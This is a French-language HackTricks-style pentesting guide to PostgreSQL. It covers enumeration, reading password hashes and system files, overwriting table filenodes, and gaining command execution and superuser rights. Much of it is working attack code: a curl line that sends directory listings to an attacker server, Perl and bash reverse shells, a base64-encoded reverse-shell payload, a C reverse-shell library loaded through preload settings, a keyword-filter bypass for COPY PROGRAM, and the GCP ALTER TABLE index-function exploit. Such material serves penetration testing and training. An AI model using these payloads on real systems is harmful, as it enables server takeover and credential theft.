# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Informations de base**

**PostgreSQL** est décrit comme un **système de gestion de base de données objet-relationnel** qui est **open source**. Ce système n'utilise pas seulement le langage SQL, il l'enrichit également avec des fonctionnalités supplémentaires. Ses capacités lui permettent de gérer un large éventail de types de données et d'opérations, en faisant un choix polyvalent pour les développeurs et les organisations.

**Port par défaut :** 5432, et si ce port est déjà utilisé il semble que postgresql utilisera le port suivant (probablement 5433) qui n'est pas utilisé.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connexion & Énumération de base
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si en exécutant **`\list`** vous trouvez une base de données appelée **`rdsadmin`**, vous savez que vous êtes dans une **AWS postgresql database**.

Pour plus d'informations sur **comment abuser d'une base de données PostgreSQL** consultez :


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Énumération automatique
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Selon [**this research**](https://www.exploit-db.com/papers/13084), lorsqu'une tentative de connexion échoue, `dblink` lève une exception `sqlclient_unable_to_establish_sqlconnection` contenant une explication de l'erreur. Des exemples de ces détails sont listés ci-dessous.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Hôte hors ligne

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port fermé
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Le port est ouvert
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ou
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port est ouvert ou filtré
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Dans les fonctions PL/pgSQL, il n'est actuellement pas possible d'obtenir les détails d'une exception. Cependant, si vous avez un accès direct au serveur PostgreSQL, vous pouvez récupérer les informations nécessaires. Si l'extraction des noms d'utilisateur et des mots de passe à partir des tables système n'est pas faisable, vous pouvez envisager d'utiliser la méthode d'attaque par wordlist abordée dans la section précédente, car elle pourrait donner des résultats positifs.

## Énumération des privilèges

### Rôles

| Type de rôle  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Le rôle possède les privilèges de superutilisateur                                                                                                   |
| rolinherit     | Le rôle hérite automatiquement des privilèges des rôles dont il est membre                                                                            |
| rolcreaterole  | Le rôle peut créer d'autres rôles                                                                                                                     |
| rolcreatedb    | Le rôle peut créer des bases de données                                                                                                              |
| rolcanlogin    | Le rôle peut se connecter. C'est‑à‑dire que ce rôle peut être utilisé comme identifiant d'autorisation de session initiale                             |
| rolreplication | Le rôle est un rôle de réplication. Un rôle de réplication peut initier des connexions de réplication et créer et supprimer des slots de réplication.  |
| rolconnlimit   | Pour les rôles pouvant se connecter, définit le nombre maximal de connexions simultanées que ce rôle peut établir. -1 signifie aucune limite.         |
| rolpassword    | Ce n'est pas le mot de passe (s'affiche toujours comme `********`)                                                                                   |
| rolvaliduntil  | Date d'expiration du mot de passe (utilisée uniquement pour l'authentification par mot de passe) ; null si pas d'expiration                          |
| rolbypassrls   | Le rôle contourne toutes les politiques de sécurité au niveau des lignes, voir [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) pour plus d'informations. |
| rolconfig      | Valeurs par défaut spécifiques au rôle pour les variables de configuration d'exécution                                                               |
| oid            | ID du rôle                                                                                                                                            |

#### Groupes intéressants

- Si vous êtes membre de **`pg_execute_server_program`**, vous pouvez **exécuter** des programmes
- Si vous êtes membre de **`pg_read_server_files`**, vous pouvez **lire** des fichiers
- Si vous êtes membre de **`pg_write_server_files`**, vous pouvez **écrire** des fichiers

> [!TIP]
> Notez que dans Postgres un **utilisateur**, un **groupe** et un **rôle** sont **identiques**. Cela dépend seulement **de la façon dont vous l'utilisez** et si vous **lui permettez de se connecter**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tables
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonctions
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Actions sur le système de fichiers

### Lire les répertoires et fichiers

Depuis ce [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) les membres du groupe défini **`DEFAULT_ROLE_READ_SERVER_FILES`** (appelé **`pg_read_server_files`**) et les **super-utilisateurs** peuvent utiliser la méthode **`COPY`** sur n'importe quel chemin (consultez `convert_and_check_filename` dans `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> N'oubliez pas que si vous n'êtes pas super user mais que vous avez la permission **CREATEROLE**, vous pouvez **vous ajouter à ce groupe :**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Il existe **other postgres functions** qui peuvent être utilisées pour **read file or list a directory**. Seuls les **superusers** et les **users with explicit permissions** peuvent les utiliser :
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Vous pouvez trouver **plus de fonctions** dans [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Écriture simple de fichiers

Seulement les **super users** et les membres de **`pg_write_server_files`** peuvent utiliser copy pour écrire des fichiers.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Souvenez-vous que si vous n'êtes pas super-utilisateur mais que vous avez la permission **`CREATEROLE`** vous pouvez **vous ajouter en tant que membre de ce groupe :**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Rappelez-vous que COPY ne peut pas gérer les caractères de nouvelle ligne, donc même si vous utilisez une payload base64 **vous devez envoyer une seule ligne**.\
Une limitation très importante de cette technique est que **`copy` ne peut pas être utilisé pour écrire des fichiers binaires car il modifie certaines valeurs binaires.**

### **Téléversement de fichiers binaires**

Cependant, il existe **d'autres techniques pour téléverser de gros fichiers binaires :**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Mise à jour des données d'une table PostgreSQL via écriture d'un fichier local

Si vous avez les permissions nécessaires pour lire et écrire les fichiers du serveur PostgreSQL, vous pouvez mettre à jour n'importe quelle table du serveur en **écrasant le filenode associé** dans [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Étapes requises :

1.  Obtenir le répertoire de données PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Note :** Si vous n'arrivez pas à récupérer le chemin du répertoire de données actuel depuis les settings, vous pouvez interroger la version majeure de PostgreSQL via la requête `SELECT version()` et essayer de brute-forcer le chemin. Les chemins communs du répertoire de données sur les installations Unix de PostgreSQL sont `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nom de cluster commun est `main`.

2.  Obtenir un chemin relatif vers le filenode associé à la table cible

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Cette requête devrait retourner quelque chose comme `base/3/1337`. Le chemin complet sur disque sera `$DATA_DIRECTORY/base/3/1337`, c.-à-d. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Télécharger le filenode via les fonctions `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obtenir le type de données associé à la table cible

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Utilisez the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users) ; mettez tous les drapeaux booléens `rol*` à 1 pour des permissions complètes.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ré-uploadez le filenode édité via les fonctions `lo_*`, et écrasez le fichier original sur le disque

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Optionnellement)_ Videz le cache en mémoire des tables en exécutant une requête SQL coûteuse

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Vous devriez maintenant voir les valeurs de la table mises à jour dans PostgreSQL.

Vous pouvez aussi devenir superadmin en éditant la table `pg_authid`. **See** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemple à exécuter :
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Rappelez-vous que si vous n'êtes pas superutilisateur mais que vous avez la permission **`CREATEROLE`**, vous pouvez **vous rendre membre de ce groupe :**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Plus d'infos.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ou utilisez le module `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Plus d'informations sur cette vulnérabilité [**ici**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Bien que signalée comme CVE-2019-9193, Postgres a déclaré que c'était une [fonctionnalité et ne sera pas corrigée](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

Dans des contextes SQLi avec des requêtes empilées, un WAF peut supprimer ou bloquer le mot-clé littéral `COPY`. Vous pouvez construire dynamiquement l'instruction et l'exécuter à l'intérieur d'un bloc PL/pgSQL DO. Par exemple, construisez le C initial avec `CHR(67)` pour contourner des filtres naïfs et EXECUTE la commande assemblée :
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern évite le filtrage statique par mots-clés et permet tout de même l'exécution de commandes OS via `COPY ... PROGRAM`. Il est particulièrement utile lorsque l'application renvoie les erreurs SQL et permet les requêtes empilées.

### RCE avec les langages PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE avec les extensions PostgreSQL

Une fois que vous avez **appris** dans le post précédent **comment uploader des fichiers binaires**, vous pouvez tenter d'obtenir **RCE en uploadant une extension postgresql et en la chargeant**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE via le fichier de configuration PostgreSQL

> [!TIP]
> Les vecteurs RCE suivants sont particulièrement utiles dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des instructions SELECT imbriquées

Le **fichier de configuration** de PostgreSQL est **modifiable** par l'**utilisateur postgres**, qui exécute la base de données ; en tant que **superuser**, vous pouvez écrire des fichiers sur le filesystem, et donc vous pouvez **écraser ce fichier.**

![](<../images/image (322).png>)

#### **RCE avec ssl_passphrase_command**

Plus d'informations [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

Le fichier de configuration possède des paramètres intéressants qui peuvent mener à une RCE :

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Chemin vers la clé privée de la base de données
- `ssl_passphrase_command = ''` Si le fichier privé est protégé par mot de passe (chiffré) postgresql **exécutera la commande indiquée dans cet attribut**.
- `ssl_passphrase_command_supports_reload = off` **Si** cet attribut est **on** la **commande** exécutée si la clé est protégée par mot de passe **sera exécutée** lorsque `pg_reload_conf()` est **exécutée**.

L'attaquant devra alors :

1. **Extraire la clé privée** depuis le serveur
2. **Chiffrer** la clé privée téléchargée :
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Écraser**
4. **Extraire** la **configuration** postgresql actuelle
5. **Écraser** la **configuration** avec les attributs mentionnés :
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Exécuter `pg_reload_conf()`

Lors des tests, j'ai remarqué que cela ne fonctionne que si le **fichier de clé privée a les permissions 640**, qu'il est **possédé par root** et par le **groupe ssl-cert ou postgres** (pour que l'utilisateur postgres puisse le lire), et qu'il est placé dans _/var/lib/postgresql/12/main_.

#### **RCE avec archive_command**

**Plus** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Un autre attribut exploitable dans le fichier de configuration est `archive_command`.

Pour que cela fonctionne, le paramètre `archive_mode` doit être `'on'` ou `'always'`. Si c'est le cas, alors nous pourrions écraser la commande dans `archive_command` et la forcer à s'exécuter via les opérations WAL (write-ahead logging).

Les étapes générales sont :

1. Vérifier si `archive_mode` est activé : `SELECT current_setting('archive_mode')`
2. Écraser `archive_command` avec le payload. Par ex., une reverse shell : `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recharger la config : `SELECT pg_reload_conf()`
4. Forcer l'opération WAL à s'exécuter, ce qui appellera la commande d'archive : `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` pour certaines versions de Postgres

##### Édition de postgresql.conf via Large Objects (SQLi-friendly)

Lorsque des écritures multi-lignes sont nécessaires (par ex., pour définir plusieurs GUCs), utilisez PostgreSQL Large Objects pour lire et écraser entièrement la config depuis SQL. Cette approche est idéale dans des contextes SQLi où `COPY` ne peut pas gérer les sauts de ligne ni les écritures binary-safe.

Exemple (ajustez la major version et le chemin si nécessaire, p.ex. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Cela permet une exécution fiable de commandes OS via `archive_command` en tant qu'utilisateur `postgres`, à condition que `archive_mode` soit activé. En pratique, définir un `archive_timeout` faible peut provoquer des invocations rapides sans nécessiter un basculement WAL explicite.

#### **RCE with preload libraries**

Plus d'informations [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ce vecteur d'attaque exploite les variables de configuration suivantes :

- `session_preload_libraries` -- bibliothèques qui seront chargées par le serveur PostgreSQL lors de la connexion du client.
- `dynamic_library_path` -- liste de répertoires où le serveur PostgreSQL recherchera les bibliothèques.

On peut définir la valeur de `dynamic_library_path` sur un répertoire inscriptible par l'utilisateur `postgres` exécutant la base de données, par exemple `/tmp/`, et y uploader un objet `.so` malveillant. Ensuite, on forcera le serveur PostgreSQL à charger notre bibliothèque nouvellement uploadée en l'incluant dans la variable `session_preload_libraries`.

Les étapes de l'attaque sont :

1. Télécharger le `postgresql.conf` original
2. Inclure le répertoire `/tmp/` dans la valeur de `dynamic_library_path`, par exemple `dynamic_library_path = '/tmp:$libdir'`
3. Inclure le nom de la bibliothèque malveillante dans la valeur de `session_preload_libraries`, par exemple `session_preload_libraries = 'payload.so'`
4. Vérifier la version majeure de PostgreSQL via la requête `SELECT version()`
5. Compiler le code de la bibliothèque malveillante avec le package dev PostgreSQL correspondant. Exemple de code :

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compilation du code :

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Uploader le `postgresql.conf` malveillant créé aux étapes 2-3 et écraser l'original
7. Uploader le `payload.so` de l'étape 5 dans le répertoire `/tmp`
8. Recharger la configuration du serveur en redémarrant le serveur ou en lançant la requête `SELECT pg_reload_conf()`
9. Lors de la prochaine connexion à la DB, vous recevrez la connexion reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Selon les [**docs**](https://www.postgresql.org/docs/13/sql-grant.html) : _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Donc, si vous avez la permission **`CREATEROLE`**, vous pourriez vous accorder l'accès à d'autres **rôles** (qui ne sont pas superuser) pouvant vous permettre de lire et écrire des fichiers et d'exécuter des commandes :
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifier le mot de passe

Les utilisateurs ayant ce rôle peuvent également **changer** les **mots de passe** d'autres **utilisateurs qui ne sont pas superutilisateurs** :
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Il est assez courant de constater que **les utilisateurs locaux peuvent se connecter à PostgreSQL sans fournir de mot de passe**. Par conséquent, une fois que vous avez obtenu **des permissions d'exécution de code** vous pouvez abuser de ces permissions pour vous accorder le rôle **`SUPERUSER`** :
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Ceci est généralement possible à cause des lignes suivantes dans le fichier **`pg_hba.conf`** :
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Dans [**cet article**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) est expliqué comment il a été possible de **privesc** dans Postgres GCP en abusant du privilège ALTER TABLE qui avait été accordé à l'utilisateur.

Lorsque vous essayez de **rendre un autre utilisateur propriétaire d'une table** vous devriez obtenir une **erreur** l'en empêchant, mais apparemment GCP a donné cette **option à l'utilisateur postgres qui n'est pas superuser** dans GCP :

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

En combinant cette idée avec le fait que lorsque les commandes **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) sont exécutées sur une **table avec une index function**, la **function** est **appelée** dans le cadre de la commande avec les **permissions du propriétaire** de la **table**. Il est possible de créer un index avec une function et d'accorder les permissions de propriétaire à un **super user** sur cette table, puis d'exécuter ANALYZE sur la table avec la function malveillante qui pourra exécuter des commandes parce qu'elle utilise les privilèges du propriétaire.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Commencez par créer une nouvelle table.
2. Insérez du contenu non pertinent dans la table pour fournir des données à la fonction d'index.
3. Développez une fonction d'index malveillante qui contient un code execution payload, permettant l'exécution de commandes non autorisées.
4. Utilisez ALTER pour changer le propriétaire de la table en "cloudsqladmin", qui est le rôle superutilisateur de GCP utilisé exclusivement par Cloud SQL pour gérer et maintenir la base de données.
5. Effectuez une opération ANALYZE sur la table. Cette action force le moteur PostgreSQL à basculer dans le contexte utilisateur du propriétaire de la table, "cloudsqladmin". Par conséquent, la fonction d'index malveillante est appelée avec les permissions de "cloudsqladmin", permettant ainsi l'exécution de la commande shell précédemment non autorisée.

Dans PostgreSQL, ce flux ressemble à ceci :
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ensuite, la table `shell_commands_results` contiendra la sortie du code exécuté :
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Connexion locale

Certaines instances postgresql mal configurées peuvent permettre la connexion de n'importe quel utilisateur local ; il est possible de se connecter depuis 127.0.0.1 en utilisant la **`dblink` fonction** :
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Notez que pour que la requête précédente fonctionne **la fonction `dblink` doit exister**. Si elle n'existe pas, vous pouvez essayer de la créer avec
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Si vous avez le mot de passe d'un utilisateur ayant plus de privilèges, mais que cet utilisateur n'est pas autorisé à se connecter depuis une IP externe, vous pouvez utiliser la fonction suivante pour exécuter des requêtes en tant que cet utilisateur :
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Il est possible de vérifier si cette fonction existe avec :
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Fonction définie par l'utilisateur avec** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters were able to privesc inside a postgres instance provided by IBM, because they **found this function with the SECURITY DEFINER flag**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) a function with **SECURITY DEFINER est exécuté** with the privileges of the **user that owns it**. Therefore, if the function is **vulnérable à SQL Injection** or is doing some **actions privilégiées avec des paramètres contrôlés par l'attaquant**, it could be abused to **escalader les privilèges dans postgres**.

In the line 4 of the previous code you can see that the function has the **SECURITY DEFINER** flag.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Brute-force de mots de passe avec PL/pgSQL

